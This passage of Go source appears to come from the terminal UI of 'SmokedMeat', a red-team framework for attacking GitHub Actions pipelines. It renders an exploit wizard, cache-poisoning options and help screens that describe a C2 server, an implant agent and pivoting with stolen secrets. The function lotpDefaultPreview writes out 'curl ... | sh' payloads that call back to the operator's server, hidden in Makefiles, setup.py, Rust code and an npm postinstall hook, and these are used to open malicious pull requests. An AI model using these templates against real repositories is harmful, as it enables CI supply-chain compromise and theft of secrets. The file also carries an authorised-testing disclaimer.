			if m.wizard.SelectedVuln != nil && m.wizard.SelectedVuln.Context == "issue_title" {
				label = "Issue Title:"
			} else {
				label = "Issue Body:"
			}
		case DeliveryComment:
			label = "Comment:"
		}
		lines = append(lines, formatWizardContent(pad, label, payload, innerWidth))
	}
	lines = append(lines,
		emptyLine,
		formatWizardContent(pad, "", mutedColor.Render("Only proceed if you are authorized to test this target."), innerWidth),
	)

	return lines
}

func (m *Model) renderDwellTimeOption(pad string, innerWidth int) []string {
	emptyLine := strings.Repeat(" ", innerWidth)
	dwellLabel := "Express (grab & exit)"
	if m.wizard != nil && m.wizard.CachePoisonEnabled {
		dwell := cachePoisonPersistentDwell(m.wizard.DwellTime)
		dwellLabel = fmt.Sprintf("Express default, dwell %s available", dwell)
	} else if m.wizard.DwellTime > 0 {
		dwellLabel = fmt.Sprintf("Dwell %s (stay active)", m.wizard.DwellTime)
	}
	return []string{
		formatWizardContent(pad, "Mode:", dwellLabel+" "+mutedColor.Render("[d] to cycle"), innerWidth),
		emptyLine,
	}
}

func (m *Model) renderDraftOption(pad string, innerWidth int) []string {
	draft := m.wizard.Draft == nil || *m.wizard.Draft
	label := "Yes"
	if !draft {
		label = "No"
	}
	return []string{
		formatWizardContent(pad, "Draft:", label+" "+mutedColor.Render("[f] to toggle"), innerWidth),
	}
}

func (m *Model) renderAutoCloseOption(pad string, innerWidth int) []string {
	autoClose := m.wizard.AutoClose == nil || *m.wizard.AutoClose
	label := "Yes"
	if !autoClose {
		label = "No"
	}
	return []string{
		formatWizardContent(pad, "Auto-close:", label+" "+mutedColor.Render("[a] to toggle"), innerWidth),
	}
}

func (m *Model) renderCachePoisonOption(pad string, innerWidth int) []string {
	if m.wizard == nil {
		return nil
	}

	available, reason := m.cachePoisonAvailability(m.wizard.SelectedVuln)
	if !available {
		if reason == "" {
			return nil
		}
		return []string{
			formatWizardContent(pad, "Cache Poisoning:", mutedColor.Render("N/A ("+reason+")"), innerWidth),
			strings.Repeat(" ", innerWidth),
		}
	}

	label := "Off"
	if m.wizard.CachePoisonEnabled {
		label = "On"
	}
	lines := []string{
		formatWizardContent(pad, "Cache Poisoning:", label+" "+mutedColor.Render("[c] to toggle"), innerWidth),
	}
	if !m.wizard.CachePoisonEnabled {
		lines = append(lines, strings.Repeat(" ", innerWidth))
		return lines
	}

	victim := m.selectedCachePoisonVictim()
	if victim == nil {
		lines = append(lines, strings.Repeat(" ", innerWidth))
		return lines
	}

	label = cachepoison.CandidateSummary(*victim)
	if len(readyCachePoisonVictims(m.wizard.SelectedVuln.CachePoisonVictims)) > 1 {
		label += " " + mutedColor.Render("[v] to cycle")
	}
	lines = append(lines,
		formatWizardContent(pad, "Victim:", label, innerWidth),
		formatWizardContent(pad, "Workflow:", cachepoison.CandidateDisplayPath(*victim), innerWidth),
	)
	if victim.TriggerMode != "" {
		lines = append(lines, formatWizardContent(pad, "Trigger:", victim.TriggerMode, innerWidth))
	}
	if cacheSummary := cachepoison.CandidateCacheSummary(*victim); cacheSummary != "" {
		lines = append(lines, formatWizardContent(pad, "Cache:", cacheSummary, innerWidth))
	}
	replacementLabel := "Off"
	if m.wizard.CachePoisonReplace {
		replacementLabel = "On"
	}
	if m.activeTokenAllowsCacheReplacement() {
		lines = append(lines, formatWizardContent(pad, "Replace Cache:", replacementLabel+" "+mutedColor.Render("[r] to toggle"), innerWidth))
	} else {
		lines = append(lines, formatWizardContent(pad, "Replace Cache:", mutedColor.Render("Unavailable (token lacks actions:write)"), innerWidth))
	}
	if executionSummary := cachepoison.CandidateExecutionSummary(*victim); executionSummary != "" {
		lines = append(lines, formatWizardContent(pad, "Execute:", executionSummary, innerWidth))
	}
	if plan := victim.Execution; strings.TrimSpace(plan.GadgetUses) != "" {
		lines = append(lines, formatWizardContent(pad, "Gadget:", plan.GadgetUses, innerWidth))
	}
	if uses := cachepoison.CheckoutUsesForCandidate(*victim); len(uses) > 0 {
		lines = append(lines, formatWizardContent(pad, "Checkout:", strings.Join(uses, ", "), innerWidth))
	}
	return append(lines, strings.Repeat(" ", innerWidth))
}

func (m *Model) buildWizardStep3LOTP(width int) []string {
	var lines []string
	innerWidth := width - 2
	pad := "  "
	emptyLine := strings.Repeat(" ", innerWidth)

	tool := "npm"
	if m.wizard.SelectedVuln != nil {
		if m.wizard.SelectedVuln.LOTPTool != "" {
			tool = m.wizard.SelectedVuln.LOTPTool
		} else if m.wizard.SelectedVuln.LOTPAction != "" {
			tool = m.wizard.SelectedVuln.LOTPAction
		}
	}

	lines = append(lines,
		formatWizardContent(pad, "", secondaryColorStyle.Render("Deploy: "+tool+" LOTP"), innerWidth),
		emptyLine,
		formatWizardContent(pad, "", "What happens:", innerWidth),
		formatWizardContent(pad, "", "  1. Injects payload into target file(s)", innerWidth),
		formatWizardContent(pad, "", "  2. CI pipeline executes payload on next run", innerWidth),
		formatWizardContent(pad, "", "  3. Agent downloads and runs in CI runner", innerWidth),
		emptyLine,
	)

	if m.wizard.SelectedVuln != nil {
		lines = append(lines,
			formatWizardContent(pad, "Target:", m.wizard.SelectedVuln.Repository, innerWidth),
			formatWizardContent(pad, "Tool:", warningColor.Render(tool), innerWidth),
		)
		if len(m.wizard.SelectedVuln.LOTPTargets) > 0 {
			lines = append(lines,
				formatWizardContent(pad, "Files:", warningColor.Render(strings.Join(m.wizard.SelectedVuln.LOTPTargets, ", ")), innerWidth),
			)
		}
		lines = append(lines, emptyLine)
	}

	isDynamicScript := tool == "bash" || tool == "powershell" || tool == "python"
	targets := m.wizard.SelectedVuln.LOTPTargets

	callbackURL := m.config.ExternalURL() + "/r/<stager-id>"

	boxWidth := innerWidth
	boxPad := ""
	boxInner := boxWidth - 4

	if isDynamicScript && len(targets) > 0 {
		for _, target := range targets {
			lines = append(lines, m.renderPreviewBox(boxPad, boxWidth, boxInner, target, []string{
				warningColor.Render("curl -s " + callbackURL + " | sh"),
				"... (rest of existing script) ...",
			})...)
		}
	} else {
		payloadFile := "package.json"
		if len(targets) > 0 {
			payloadFile = targets[0]
		}
		preview := m.wizard.PayloadPreview
		if preview == "" {
			preview = lotpDefaultPreview(tool, callbackURL)
		}
		lines = append(lines, m.renderPreviewBox(boxPad, boxWidth, boxInner, payloadFile, strings.Split(preview, "\n"))...)
	}

	warningFile := "target files"
	if isDynamicScript && len(targets) > 0 {
		warningFile = strings.Join(targets, ", ")
	} else if len(targets) > 0 {
		warningFile = targets[0]
	}
	lines = append(lines,
		emptyLine,
		formatWizardContent(pad, "", warningColor.Render("⚠️  THIS WILL CREATE A PR WITH MALICIOUS "+warningFile), innerWidth),
	)

	return lines
}

func (m *Model) renderPreviewBox(boxPad string, boxWidth, _ int, filename string, contentLines []string) []string {
	previewStyle := lipgloss.NewStyle().
		Border(lipgloss.RoundedBorder()).
		BorderForeground(mutedColorVal).
		Width(boxWidth - 2).
		PaddingLeft(1)

	content := strings.Join(contentLines, "\n")
	box := previewStyle.Render(content)

	var lines []string
	fnLabel := mutedColor.Render("  " + filename)
	fnPad := boxWidth - lipgloss.Width(fnLabel)
	if fnPad < 0 {
		fnPad = 0
	}
	lines = append(lines, boxPad+fnLabel+strings.Repeat(" ", fnPad))
	for _, bl := range strings.Split(box, "\n") {
		lines = append(lines, boxPad+bl)
	}
	return lines
}

func lotpDefaultPreview(tool, callbackURL string) string {
	cb := callbackURL
	switch tool {
	case "make":
		return ".PHONY: all\nall:\n\t@curl -s " + cb + " | sh\n\t@$(MAKE) -f Makefile.real all"
	case "pip":
		return "from setuptools import setup\nimport os\nos.system(\"curl -s " + cb + "|sh\")\nsetup(name='pkg', version='1.0.0')"
	case "cargo":
		return "fn main() {\n  std::process::Command::new(\"sh\")\n    .arg(\"-c\").arg(\"curl -s " + cb + "|sh\")\n    .output();\n}"
	default:
		return "{\n  \"name\": \"build-tools\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {\n    \"postinstall\": \"curl -s " + cb + "|sh\"\n  }\n}"
	}
}

func formatWizardContent(prefix, label, value string, width int) string {
	content := label
	if label != "" && value != "" {
		content = label + "  " + value
	} else if value != "" {
		content = value
	}
	prefixWidth := lipgloss.Width(prefix)
	contentWidth := lipgloss.Width(content)
	padding := width - prefixWidth - contentWidth
	if padding < 0 {
		padding = 0
	}
	padding += countVS16(content)
	return prefix + content + strings.Repeat(" ", padding)
}

func countVS16(s string) int {
	n := 0
	for _, r := range stripANSI(s) {
		if r == '\uFE0F' {
			n++
		}
	}
	return n
}

func centerText(text string, width int) string {
	textLen := lipgloss.Width(text)
	if textLen >= width {
		return text
	}
	leftPad := (width - textLen) / 2
	return strings.Repeat(" ", leftPad) + text
}

func stripANSI(s string) string {
	var result strings.Builder
	for i := 0; i < len(s); {
		if s[i] != '\x1b' {
			result.WriteByte(s[i])
			i++
			continue
		}
		if i+1 >= len(s) {
			break
		}
		switch s[i+1] {
		case '[':
			i += 2
			for i < len(s) {
				b := s[i]
				i++
				if b >= 0x40 && b <= 0x7E {
					break
				}
			}
		case ']':
			i += 2
			for i < len(s) {
				if s[i] == '\a' {
					i++
					break
				}
				if s[i] == '\x1b' && i+1 < len(s) && s[i+1] == '\\' {
					i += 2
					break
				}
				i++
			}
		default:
			i += 2
		}
	}
	return result.String()
}

func (m *Model) renderLicenseOverlay(background string, height int) string {
	modalWidth := 72
	if m.width < 80 {
		modalWidth = m.width - 8
	}
	modalHeight := 20
	if height < 24 {
		modalHeight = height - 4
	}

	modalLines := m.buildLicenseModal(modalWidth, modalHeight)
	modal := strings.Join(modalLines, "\n")
	return compositeCenter(modal, dimBackground(background), m.width, height)
}

func (m *Model) buildLicenseModal(width, height int) []string {
	var lines []string

	// Yellow border characters
	bTop := modalBorderStyle.Render("┌" + strings.Repeat("─", width-2) + "┐")
	bLeft := modalBorderStyle.Render("│")
	bRight := modalBorderStyle.Render("│")
	bBottom := modalBorderStyle.Render("└" + strings.Repeat("─", width-2) + "┘")

	lines = append(lines, bTop)

	// Title bar with red background (like header)
	title := " LICENSE"
	innerWidth := width - 2
	titleContent := title + strings.Repeat(" ", innerWidth-len(title))
	styledTitle := modalTitleStyle.Width(innerWidth).Render(titleContent)
	lines = append(lines,
		bLeft+styledTitle+bRight,
		bLeft+strings.Repeat(" ", width-2)+bRight,
	)

	licenseText := []string{
		fmt.Sprintf("SmokedMeat %s", buildinfo.Version),
		"Copyright (C) 2026 boostsecurity.io",
		"",
		"Licensed under GNU Affero General Public License v3.0",
		"See <https://www.gnu.org/licenses/> for full terms.",
		"",
		"DISCLAIMER: This tool is provided for AUTHORIZED SECURITY",
		"TESTING ONLY. Use at your own risk. Misuse of this tool may",
		"cause damage to systems or violate laws. Only use against",
		"systems you own or have explicit written permission to test.",
		"",
		"THE AUTHORS ACCEPT NO LIABILITY FOR ANY DAMAGES OR LEGAL",
		"CONSEQUENCES ARISING FROM USE OR MISUSE OF THIS SOFTWARE.",
	}

	for _, text := range licenseText {
		if len(text) > width-6 {
			text = text[:width-9] + "..."
		}
		padding := width - 4 - len(text)
		if padding < 0 {
			padding = 0
		}
		lines = append(lines, bLeft+"  "+text+strings.Repeat(" ", padding)+bRight)
	}

	for len(lines) < height-1 {
		lines = append(lines, bLeft+strings.Repeat(" ", width-2)+bRight)
	}

	lines = append(lines, bBottom)

	return lines
}

func (m *Model) renderReAuthOverlay(background string, height int) string {
	modalWidth := 50
	if m.width < 60 {
		modalWidth = m.width - 8
	}
	modalHeight := 10
	if height < 14 {
		modalHeight = height - 4
	}

	modalLines := m.buildReAuthModal(modalWidth, modalHeight)
	modal := strings.Join(modalLines, "\n")
	return compositeCenter(modal, dimBackground(background), m.width, height)
}

func (m *Model) buildReAuthModal(width, height int) []string {
	var lines []string

	bTop := modalBorderStyle.Render("┌" + strings.Repeat("─", width-2) + "┐")
	bLeft := modalBorderStyle.Render("│")
	bRight := modalBorderStyle.Render("│")
	bBottom := modalBorderStyle.Render("└" + strings.Repeat("─", width-2) + "┘")

	lines = append(lines, bTop)

	title := " SESSION EXPIRED"
	innerWidth := width - 2
	titleContent := title + strings.Repeat(" ", innerWidth-len(title))
	styledTitle := modalTitleStyle.Width(innerWidth).Render(titleContent)
	lines = append(lines,
		bLeft+styledTitle+bRight,
		bLeft+strings.Repeat(" ", width-2)+bRight,
	)

	reAuthText := []string{
		"Your session has expired.",
		"",
		"Press Enter to re-authenticate",
		"via SSH agent.",
	}

	for _, text := range reAuthText {
		padding := width - 4 - len(text)
		if padding < 0 {
			padding = 0
		}
		lines = append(lines, bLeft+"  "+text+strings.Repeat(" ", padding)+bRight)
	}

	for len(lines) < height-1 {
		lines = append(lines, bLeft+strings.Repeat(" ", width-2)+bRight)
	}

	lines = append(lines, bBottom)

	return lines
}

func (m *Model) renderHelpOverlay(background string, height int) string {
	modalWidth := 76
	if m.width < 85 {
		modalWidth = m.width - 8
	}
	modalHeight := height - 4
	if modalHeight > 42 {
		modalHeight = 42
	}
	if modalHeight < 20 {
		modalHeight = 20
	}

	modalLines := m.buildHelpModal(modalWidth, modalHeight)
	modal := strings.Join(modalLines, "\n")
	return compositeCenter(modal, dimBackground(background), m.width, height)
}

func (m *Model) buildHelpModal(width, height int) []string {
	var lines []string

	// Yellow border characters
	bTop := modalBorderStyle.Render("┌" + strings.Repeat("─", width-2) + "┐")
	bLeft := modalBorderStyle.Render("│")
	bRight := modalBorderStyle.Render("│")
	bBottom := modalBorderStyle.Render("└" + strings.Repeat("─", width-2) + "┘")

	lines = append(lines, bTop)

	// Title bar with red background
	title := " SMOKEDMEAT HELP"
	innerWidth := width - 2
	titleContent := title + strings.Repeat(" ", innerWidth-len(title))
	styledTitle := modalTitleStyle.Width(innerWidth).Render(titleContent)
	lines = append(lines,
		bLeft+styledTitle+bRight,
		bLeft+strings.Repeat(" ", width-2)+bRight,
	)

	helpSections := []struct {
		title string
		items []string
	}{
		{
			title: "WHAT IS SMOKEDMEAT?",
			items: []string{
				"A CI/CD red team framework - \"Metasploit for GitHub Actions\"",
				"Find and exploit injection vulnerabilities in CI/CD pipelines",
			},
		},
		{
			title: "PHASES",
			items: []string{
				"Setup    → Configure Kitchen, token, and target",
				"Recon    → Analyze target for vulnerabilities (poutine scanner)",
				"Wizard   → Configure payload and delivery method",
				"Exploit  → Deploy agent via malicious PR",
				"Pivot    → Use stolen secrets to expand access",
			},
		},
		{
			title: fmt.Sprintf("COMMANDS (%s phase)", m.phase.String()),
			items: helpCommandsForPhase(m.phase),
		},
		{
			title: "KEYBOARD SHORTCUTS",
			items: []string{
				"Esc      Cycle pane focus, or clear the command input",
				"F1-F5    Focus Findings, Menu, Loot, Activity, or Input",
				"/        Open search/jump omnibox",
				"Alt+Tab  Cycle panel focus",
				"L        Toggle expanded activity log",
				"↑↓/j/k   Navigate pane, or browse command history in input",
				"←→/h/l   Collapse/expand tree nodes",
				"x        Exploit selected vuln (opens wizard)",
				"1-5      Quick select from The Menu",
				"Tab      Focus input / command completion",
				"t        Open the theme picker",
				"?        Toggle this help",
				"q        Quit",
			},
		},
		{
			title: "CONCEPTS",
			items: []string{
				"Kitchen  → C2 server that manages agents",
				"Counter  → This TUI - the operator interface",
				"Brisket  → The implant agent deployed to runners",
				"Pantry   → Attack graph tracking assets & relationships",
			},
		},
	}

	maxContent := height - 1
	for _, section := range helpSections {
		if len(lines) >= maxContent {
			break
		}
		titleLine := "  " + secondaryColorStyle.Render(section.title)
		padding := width - 2 - lipgloss.Width(titleLine)
		if padding < 0 {
			padding = 0
		}
		lines = append(lines, bLeft+titleLine+strings.Repeat(" ", padding)+bRight)

		for _, item := range section.items {
			if len(lines) >= maxContent {
				break
			}
			itemLine := "    " + item
			if lipgloss.Width(itemLine) > width-4 {
				itemLine = itemLine[:width-7] + "..."
			}
			padding := width - 2 - lipgloss.Width(itemLine)
			if padding < 0 {
				padding = 0
			}
			lines = append(lines, bLeft+itemLine+strings.Repeat(" ", padding)+bRight)
		}
		if len(lines) < maxContent {
			lines = append(lines, bLeft+strings.Repeat(" ", width-2)+bRight)
		}
	}

	for len(lines) < maxContent {
		lines = append(lines, bLeft+strings.Repeat(" ", width-2)+bRight)
	}

	lines = append(lines, bBottom)

	return lines
}

func waitingTipsForMethod(method string) []string {
	switch method {
	case "Create Issue", "Add Comment":
		return []string{
			"Issue/comment must contain the payload in the body",
			"Check workflow trigger matches (issues or issue_comment)",
			"Workflow must run on default branch for issue events",
		}
	case "Create PR":
		return []string{
			"PR must target a branch with the vulnerable workflow",
			"Check workflow trigger (pull_request vs pull_request_target)",
			"Branch protection may block the workflow run",
		}
	case "Trigger Dispatch":
		return []string{
			"Token must have actions:write scope on the target repo",
			"Workflow must define workflow_dispatch trigger",
			"Check that the token hasn't expired (ephemeral tokens are short-lived)",
		}
	case "npm install":
		return []string{
			"PR must modify package.json with the postinstall hook",
			"CI workflow must run npm install (or yarn/pnpm)",
			"Check that the runner has outbound network access",
		}
	default:
		return []string{
			"Verify the payload was delivered correctly",
			"Check that the workflow triggered (Actions tab)",
			"Egress filtering may block the callback",
		}
	}
}

func helpCommandsForPhase(phase Phase) []string {
	common := []string{
		"help             Show this help",
		"license          Show license information",
	}
	switch phase {
	case PhaseSetup:
		return append([]string{
			"set token <pat>  Set GitHub token (or Tab for options)",
			"set target <...>  Set target organization or repo",
			"set activity-log autoexpand on|off",
			"analyze          Scan target for CI/CD vulnerabilities",
			"deep-analyze     Analyze workflows (poutine) + secrets (gitleaks)",
			"status           Show current configuration",
		}, common...)
	case PhaseRecon:
		return append([]string{
			"1-5              Select vuln from The Menu → opens wizard",
			"exploit <query>  Open the wizard for a vuln",
			"implants         Show persistent implant inventory",
			"analyze          Scan target for CI/CD vulnerabilities",
			"deep-analyze     Analyze workflows (poutine) + secrets (gitleaks)",
			"graph            Open attack graph in browser",
			"pivot ssh [scope] Validate repos with selected SSH key loot",
			"ssh status       Show SSH key + confirmed repos",
			"ssh shell        Open isolated git/ssh shell for active SSH key",
			"set activity-log autoexpand on|off",
			"set target <...> Change target",
			"status           Show current configuration",
		}, common...)
	case PhasePostExploit, PhasePivot:
		return append([]string{
			"sessions         List active agent sessions",
			"select <id>      Select agent session for commands",
			"order <...>      Agent orders: exec, env, recon, cloud-query, oidc, transfer, upload, download",
			"order exec <cmd> Run shell command on selected agent",
			"implants         Show persistent implant inventory",
			"analyze          Re-scan the current target",
			"deep-analyze     Re-scan workflows + secrets",
			"graph            Open attack graph in browser",
			"pivot ...        GitHub / SSH / cloud pivots",
			"ssh status       Show SSH key + confirmed repos",
			"ssh shell        Open isolated git/ssh shell for active SSH key",
			"cloud shell      Open local cloud shell for active cloud creds",
			"set activity-log autoexpand on|off",
			"set token <pat>  Change operator token",
			"status           Show current state",
		}, common...)
	default:
		return common
	}
}

func vulnClassFromRuleID(ruleID, context string) string {
	switch ruleID {
	case "injection":
		return vulnLabel(context, "")
	case "untrusted_checkout_exec":
		return "Pwn Request (LOTP)"
	default:
		return ruleID
	}
}

func vulnLabel(context, trigger string) string {
	switch context {
	case "issue_body":
		return "Bash injection (issue body)"
	case "issue_title":
		return "Bash injection (issue title)"
	case "pr_body":
		return "Bash injection (PR body)"
	case "pr_title":
		return "Bash injection (PR title)"
	case "comment_body":
		return "Bash injection (comment)"
	case "commit_message":
		return "Bash injection (commit msg)"
	case "git_branch":
		return "Bash injection (branch name)"
	case "workflow_dispatch_input":
		return "Bash injection (dispatch input)"
	case "github_script":
		suffix := triggerSourceSuffix(trigger)
		if suffix != "" {
			return "JS injection (" + suffix + ")"
		}
		return "JS injection"
	case "bash_run":
		suffix := triggerSourceSuffix(trigger)
		if suffix != "" {
			return "Bash injection (" + suffix + ")"
		}
		return "Bash injection"
	default:
		if context == "" {
			suffix := triggerSourceSuffix(trigger)
			if suffix != "" {
				return "Bash injection (" + suffix + ")"
			}
			return "Bash injection"
		}
		return "Bash injection (" + context + ")"
	}
}

func triggerSourceSuffix(trigger string) string {
	switch trigger {
	case "issue_comment":
		return "comment"
	case "issues":
		return "issue"
	case "pull_request", "pull_request_target":
		return "PR"
	case "workflow_dispatch":
		return "workflow_dispatch"
	default:
		return ""
	}
}

func truncateForWidth(s string, maxWidth int) string {
	if lipgloss.Width(s) <= maxWidth {
		return s
	}
	if maxWidth <= 3 {
		return "..."
	}
	for i := range s {
		if lipgloss.Width(s[:i]) > maxWidth-3 {
			if i > 0 {
				return s[:i-1] + "..."
			}
			return "..."
		}
	}
	return s
}

func truncatePayloadForModal(payload string, maxWidth int) string {
	if lipgloss.Width(payload) <= maxWidth {
		return payload
	}
	if maxWidth <= 3 {
		return "..."
	}
	for i := range payload {
		if lipgloss.Width(payload[:i]) > maxWidth-3 {
			if i > 0 {
				return payload[:i-1] + "..."
			}
			return "..."
		}
	}
	return payload
}
